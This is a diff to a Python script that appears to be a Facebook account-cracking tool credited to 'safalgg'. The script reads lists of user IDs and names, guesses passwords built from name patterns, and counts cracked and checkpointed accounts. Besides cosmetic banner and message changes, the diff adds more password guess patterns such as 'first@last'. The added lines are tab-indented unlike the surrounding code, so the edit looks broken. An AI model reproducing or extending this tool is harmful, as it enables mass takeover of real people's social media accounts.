@@ -115,16 +115,17 @@ for agent in range(10000):
 logo=("""\033[1;37m
 
 
-██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
-██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
-██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
-██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
-██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
-╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░\u001b[31mSAFAL
+######## ########  ######  ######## 
+   ##    ##       ##    ##    ##    
+   ##    ##       ##          ##    
+   ##    ######    ######     ##    
+   ##    ##             ##    ##    
+   ##    ##       ##    ##    ##    
+   ##    ########  ######     ##    \u001b[31mBETA
 \033[1;37m-------------------------------------------
  GITHUB      : safalgg
  FACEBOOK    : Anonymous
- VERSION     :\u001b[32m 2.0\033[1;37m
+ VERSION     :\u001b[32m Beta\033[1;37m
 \033[1;37m-------------------------------------------""")
 
 #------------------[ ALL DEFS HERE ]-------------------#
@@ -153,7 +154,7 @@ cps=[]
 pcp=[]
 id=[]
 tokenku=[]
-sys.stdout.write('\x1b]2; SAFAL THE GOD\x07')
+sys.stdout.write('\x1b]2; TOOL UPDATIFY !!\x07')
 
 #------------------[ CONTACT ADMIN ]-------------------#
 
@@ -457,7 +458,7 @@ def gmail():
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        print("\033[1;37m \x1b[38;5;208mNTC DATA IS PREFERRED\033[1;37m")
                         linex()
                         for user in fo:
                                 ids,names = user.split('|')
@@ -472,11 +473,11 @@ def gmail():
                                 NEPAL.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
-                print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' The process has been ended')
+                print(' Total XD/NG: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python NEPAL.py')
+                os.system('python nepal.py')
 
 #------------------[ MENU'S ]-------------------#
 
@@ -508,16 +509,16 @@ def menu():
                                         fo = open(file_path, 'r').read().splitlines()
                                     except (FileNotFoundError,KeyError,IOError):
                                         print('\033[1;37m-------------------------------------------')
-                                        animation(' \033[1;37m[\u001b[36m×\033[1;37m] FILE LOCATION NOT FOUND')
+                                        animation(' \033[1;37m[\u001b[36m×\033[1;37m] FILE LOCATION IS INVALID')
                                         time.sleep(2)
                                         menu()
                                 elif FileNotFoundError:
                                     print('\033[1;37m-------------------------------------------')
-                                    animation(' \033[1;37m[\u001b[36m×\033[1;37m] FILE LOCATION NOT FOUND')
+                                    animation(' \033[1;37m[\u001b[36m×\033[1;37m] FILE LOCATION IS INVALID')
                                     time.sleep(2)
                                     menu()
                                 clear()
-                                print(' \033[1;37m[\u001b[36m•\033[1;37m] ALL METHOD WORKING TRY 1 BY 1 ')
+                                print(' \033[1;37m[\u001b[36m•\033[1;37m] ALL METHOD ARE BEST TRY THEM ALL')
                                 linex()
                                 print(' \033[1;37m[\u001b[36m1\033[1;37m] FOR NEW IDz \n \033[1;37m[\u001b[36m2\033[1;37m] FOR MIX IDz (BEST)\n \033[1;37m[\u001b[36m3\033[1;37m] FOR OLD IDz')
                                 linex()
@@ -571,6 +572,12 @@ def menu():
                                     plist.append('first1234@')
                                     plist.append('last123@')
                                     plist.append('last1234@')
+					plist.append('first##')
+					plist.append('first@last')
+					plist.append('First@Last')
+					plist.append('last@first')
+					plist.append('first@@')
+					plist.append('last@@')
                                 else:
                                     try:
                                         ps_limit = int(input(' \033[1;37m[\u001b[36m•\033[1;37m] SET PASSWORD LIMIT : '))
